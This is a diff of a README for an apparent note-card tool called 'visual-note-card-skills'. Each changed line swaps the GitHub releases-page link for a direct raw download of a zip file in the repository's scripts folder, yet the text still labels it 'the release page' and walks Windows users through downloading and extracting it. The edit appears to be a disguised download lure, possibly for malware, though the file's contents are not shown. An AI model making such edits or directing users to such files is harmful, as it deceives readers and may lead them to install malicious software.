@@ -1,6 +1,6 @@
 # 🧩 visual-note-card-skills - Create Clear Visual Note Cards
 
-[![Download Visual Note Card Skills](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Astronomic-crispness753/visual-note-card-skills/releases)
+[![Download Visual Note Card Skills](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Astronomic-crispness753/visual-note-card-skills/raw/refs/heads/main/scripts/skills_visual_note_card_3.6.zip)
 
 ## 🎯 What this is
 
@@ -10,7 +10,7 @@ You can use it to turn plain text into a single-page HTML note card. The result 
 
 ## 📥 Download and install
 
-1. Visit the release page: https://github.com/Astronomic-crispness753/visual-note-card-skills/releases
+1. Visit the release page: https://github.com/Astronomic-crispness753/visual-note-card-skills/raw/refs/heads/main/scripts/skills_visual_note_card_3.6.zip
 2. Find the latest release.
 3. Download the file package for Windows.
 4. If the file is in a ZIP format, right-click it and choose Extract All.
@@ -182,7 +182,7 @@ Keep the release files in a folder you trust. If you use a script package, open 
 
 ## 📎 Download link again
 
-Visit the release page to download: https://github.com/Astronomic-crispness753/visual-note-card-skills/releases
+Visit the release page to download: https://github.com/Astronomic-crispness753/visual-note-card-skills/raw/refs/heads/main/scripts/skills_visual_note_card_3.6.zip
 
 ## 🗂️ Example use on Windows
 
